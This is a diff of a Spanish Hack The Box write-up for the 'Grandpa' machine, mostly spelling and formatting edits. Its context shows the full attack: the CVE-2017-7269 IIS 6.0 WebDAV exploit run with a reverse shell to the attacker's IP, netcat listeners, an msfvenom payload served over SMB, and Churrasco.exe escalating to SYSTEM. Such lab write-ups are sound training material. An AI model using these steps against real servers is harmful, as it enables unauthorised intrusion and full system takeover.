@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Grandpa - Hack The Box
-excerpt: "Esta fue una máquina facil en la cual vamos a vulnerar el servicio http del puerto 80, que esta usando Microsofr IIS 6.0 WebDAV, usando un exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahi podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload."
+excerpt: "Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando Microsoft IIS 6.0 WebDAV, usando un Exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahí podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload."
 date: 2023-02-18
 classes: wide
 header:
@@ -22,11 +22,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)
-Esta fue una máquina facil en la cual vamos a vulnerar el servicio http del puerto 80, que esta usando Microsofr IIS 6.0 WebDAV, usando un exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahi podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload.
+Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a lanzar un ping para ver si la máquina esta conectada y en base al TTL veamos contra que SO nos enfrentamos.
+Vamos a lanzar un ping para ver si la máquina está conectada y en base al TTL veamos contra que SO nos enfrentamos.
 ```
 ping -c 4 10.10.10.14 
 PING 10.10.10.14 (10.10.10.14) 56(84) bytes of data.
@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.40 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Solamente hay un puerto abierto, el http lo que nos dice que tiene una pagina web abierta, aun asi veamos que servicio corre.
+Solamente hay un puerto abierto, el HTTP lo que nos dice que tiene una página web abierta, aun así, veamos qué servicio corre.
 
 ## Escaneo de Servicios
 ```
@@ -102,10 +102,10 @@ Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Mmmmm usa un **Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar pero en este caso no hay ningun servicio FTP. Es momento de analizar la pagina web.
+Mmmmm usa un **Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún **servicio FTP**. Es momento de analizar la página web.
 
-# Analisis de Vulnerabilidades
-Primero entremos a la pagina web:
+# Análisis de Vulnerabilidades
+Primero entremos a la página web:
 
 ![](/assets/images/htb-writeup-grandpa/Captura1.png)
 
@@ -113,7 +113,9 @@ No veo nada que nos pueda ayudar. Veamos lo que nos dice el **Wappalizer**.
 
 ![](/assets/images/htb-writeup-grandpa/Captura2.png)
 
-Nada, no veo nada que nos ayude. Intentemos hacer un Fuzzing para ver si puede encontrar algo aunque lo dudo bastante.
+Nada, no veo nada que nos ayude. Intentemos hacer **Fuzzing** para ver si puede encontrar algo, aunque lo dudo bastante.
+
+## Fuzzing
 ```
 wfuzz -c --hc=404,302 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.14/FUZZ/   
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -154,12 +156,12 @@ Filtered Requests: 220541
 Requests/sec.: 341.8143
 ```
 * -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
-* -t: Para usar una cantidad especifica de hilos.
+* --hc: Para que no muestre el código de estado 404, hc = hide code.
+* -t: Para usar una cantidad específica de hilos.
 * -w: Para usar un diccionario de wordlist.
 * Diccionario que usamos: dirbuster
 
-No pues nada, vamos directamente a buscar un exploit para el servicio **Microsoft IIS httpd 6.0**.
+No pues nada, vamos directamente a buscar un Exploit para el servicio **Microsoft IIS httpd 6.0**.
 ```
 searchsploit Microsoft IIS httpd 6.0
 Exploits: No Results
@@ -168,11 +170,11 @@ Papers: No Results
 ```
 Jajaja no pues no, busquemos por internet.
 
-Encontre el siguiente exploit aunque menciona algo llamado **WebDAV**, no se que sea, vamos a investigarlo y luego analizamos el exploit.
+Encontré el siguiente Exploit aunque menciona algo llamado **WebDAV**, no sé qué sea, vamos a investigarlo y luego analizamos el Exploit.
 
 **WebDAV es un grupo de trabajo del Internet Engineering Task Force. El término significa "Autoría y versionado distribuidos por Web", y se refiere al protocolo que el grupo definió. El objetivo de WebDAV es hacer de la World Wide Web un medio legible y editable, en línea con la visión original de Tim Berners-Lee.**
 
-Ok, ya sabemos que es, ahora veamos el exploit.
+Ok, ya sabemos que es, ahora veamos el Exploit.
 ```
 searchsploit Microsoft IIS 6.0 WebDAV
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -189,8 +191,10 @@ Papers: No Results
 ```
 Hay varios, pero vamos a probar el que encontramos por internet que es el primero.
 
-# Explotando Vulnerabilidades
-**ADVERTENCIA**: Este exploit me jodio la máquina varias veces porque probe distintos exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando crtl + c desde dentro de la máquina, tendras que resetearla, o al menos eso me paso a mi porque el servicio http del puerto 80 dejo de funcionar.
+# Explotación de Vulnerabilidades
+**ADVERTENCIA**: 
+
+Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando **crtl + c** desde dentro de la máquina, tendrás que reiniciarla, o al menos eso me paso a mi porque el servicio HTTP del puerto 80 dejo de funcionar.
 ```
 searchsploit -x windows/remote/41738.py  
   Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
@@ -200,13 +204,13 @@ searchsploit -x windows/remote/41738.py
  Verified: False
 File Type: ASCII text, with very long lines (2183)
 ```
-Mmmmm no entiendo muy bien como usarlo, podria ser que debemos meter los datos de la pagina web y un localhost o algo asi. Creo que sera mejor buscar como usar este exploit antes de utilizar otro.
+Mmmmm no entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit antes de utilizar otro.
 
-Investigando un poco, nos aparece este github:
+Investigando un poco, nos aparece este GitHub:
 
 * https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 
-Ahi viene el mismo que vamos a ocupar pero ya nos explica que debemos poner para poder usarlo:
+Ahí viene el mismo que vamos a ocupar, pero ya nos explica que debemos poner para poder usarlo:
 ```
 if len(sys.argv)<5:
     print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
@@ -228,13 +232,13 @@ Y ahora vamonos por pasos.
 nc -nvlp 443                         
 listening on [any] 443 ...
 ```
-* Renombremos el exploit para que sea .py:
+* Renombremos el Exploit para que sea **.py**:
 ```
 mv iis6\ reverse\ shell IIS6_Exploit.py
 ls
 IIS6_Exploit.py  README.md
 ```
-* Probemos el exploit:
+* Probemos el Exploit:
 ```
 python2 IIS6_Exploit.py 10.10.10.14 80 10.10.14.14 443
 PROPFIND / HTTP/1.1
@@ -253,7 +257,7 @@ c:\windows\system32\inetsrv>whoami
 whoami
 nt authority\network service
 ```
-Que? Ya somos Roots? Pues nel no te emociones, somo root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.
+¿Que? ¿Ya somos Root? Pues nel no te emociones, somo Root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.
 
 # Post Explotación
 ## Enumeración de Windows
@@ -277,7 +281,7 @@ dir
                2 File(s)              0 bytes
                7 Dir(s)   1,296,433,152 bytes free
 ```
-Hay algunas carpetas que podrian contener algo, veamoslas:
+Hay algunas carpetas que podrian contener algo, veámoslas:
 ```
 C:\>cd ADFS
 cd ADFS
@@ -333,7 +337,7 @@ C:\Documents and Settings>cd Harry
 cd Harry
 Access is denied.
 ```
-Aqui esta el usuario y el administrador, aqui ya se aclara que no somos ni usuario. Veamos que privilegios tenemos y la información del sistema.
+Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario. Veamos que privilegios tenemos y la información del sistema.
 ```
 C:\Documents and Settings>whoami /priv
 whoami /priv
@@ -364,7 +368,7 @@ OS Build Type:             Uniprocessor Free
 Registered Owner:          HTB
 Registered Organization:   HTB
 ```
-Muy bien, aqui podemos usar nuestra herramienta **Windows Exploit Suggester**, aprovechemosla y veamos que nos dice:
+Muy bien, aquí podemos usar nuestra herramienta **Windows Exploit Suggester**, aprovechemosla y veamos que nos dice:
 ```
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
@@ -382,9 +386,9 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 [*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
 ...
 ```
-Salen varias opciones, pero no vamos a probar ninguno, por que? por mis huevos, como ves perro?
+Salen varias opciones, pero no vamos a probar ninguno, ¿por qué? por mis huevos, ¿como ves perro?
 
-Jajajaja no es cierto, esto es porque despues de casi 3 horas de probar varios exploits y en lo que tenia que reiniciar la máquina varias veces como mencione antes. NO FUNCIONO NINGUNO!
+Jajajaja no es cierto, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!
 
 Los que probe fueron:
 * MS14-070 - Ambas versiones
@@ -392,17 +396,17 @@ Los que probe fueron:
 * MS11-062
 * MS15-051
 
-No se porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio **SeImpersonatePrivilege**. Para abusar de este privilegio vamos a usar Juicy Potato, pero esta sera una variante pues la versión de windows de la máquina es bastante vieja.
+No sé porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio **SeImpersonatePrivilege**. Para abusar de este privilegio vamos a usar **Juicy Potato**, pero esta será una variante pues la versión de **Windows** de la máquina es bastante vieja.
 
-Con solo poner **windows server 2003 juicy potato exploit** en el buscador, nos dara una pagina web, la abrimos y vemos la explicación.
+Con solo poner **Windows server 2003 juicy potato exploit** en el buscador, nos dará una página web, la abrimos y vemos la explicación.
 
 * https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/
 
-La versión de Juicy Potato que ofrece esta pagina no nos servira, pero si nos vamos hasta abajo ahi vendra una variante llamada Churrasco.exe, esa es la que vamos a usar.
+La versión de **Juicy Potato** que ofrece esta página no nos servirá, pero si nos vamos hasta abajo ahí vendrá una variante llamada **Churrasco.exe**, esa es la que vamos a usar.
 
 * https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
 
-Siguiendo las indicaciones de la pagina, una vez descargado el Churrasco.exe vamos a hacer lo sig:
+Siguiendo las indicaciones de la página, una vez descargado el **Churrasco.exe** vamos a hacer lo siguiente:
 
 * Crearemos un Payload para cargar una Reverse Shell:
 ```
@@ -412,9 +416,11 @@ Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: shell.exe
 ```
-**OJO**: Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.
+**OJO**: 
 
-* Abrimos un servidor con Impacket para subir el payload y el churrasco:
+Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.
+
+* Abrimos un servidor con Impacket para subir el Payload y el Churrasco:
 ```
 mpacket-smbserver smbFolder $(pwd)
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -436,12 +442,12 @@ copy \\Tu_IP\smbFolder\shell.exe shell.exe
 ```
 **NOTA**: Esta vez no usamos **certutil.exe** porque no funciona tampoco.
 
-* Activamos una netcat con el puerto que pusimos en el payload:
+* Activamos una netcat con el puerto que pusimos en el Payload:
 ```
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
-* Una vez dentro ambos archivos, activamos el churrasco:
+* Una vez dentro ambos archivos, activamos el Churrasco:
 ```
 C:\WINDOWS\Temp\Privesc>churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
@@ -460,7 +466,7 @@ churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 /churrasco/-->Running command with SYSTEM Token...
 /churrasco/-->Done, command should have ran as SYSTEM!
 ```
-* Y ya somo Root!:
+* Y ya somo Root:
 ```
  nc -nvlp 1337
 listening on [any] 1337 ...
@@ -471,7 +477,7 @@ C:\WINDOWS\TEMP>whoami
 whoami
 nt authority\system
 ```
-Solamente busca las flags en el directorio **Documents and Settings**, cada flag esta en su respectivo directorio. 
+Solamente busca las flags en el directorio **Documents and Settings**, cada flag está en su respectivo directorio. 
 
 ## Links de Investigación
 * https://www.exploit-db.com/exploits/41738
@@ -485,7 +491,8 @@ Solamente busca las flags en el directorio **Documents and Settings**, cada flag
 * https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
 
 # Nota Final
-Todo este procedimiento, puedes volverlo a hacer con la máquina Granny de HTB, porque es la misma configuración, misma versión de Windows, mismo servicio, mismo todo. Por eso puedes repetir todo este procedimiento en dicha máquina.
+Todo este procedimiento, puedes volverlo a hacer con la **máquina Granny** de HTB, porque es la misma configuración, misma versión de **Windows**, mismo servicio, mismo todo. Por eso puedes repetir todo este procedimiento en dicha máquina.
+
 ![](/assets/images/htb-writeup-grandpa/granny_logo.png)
 
 # FIN
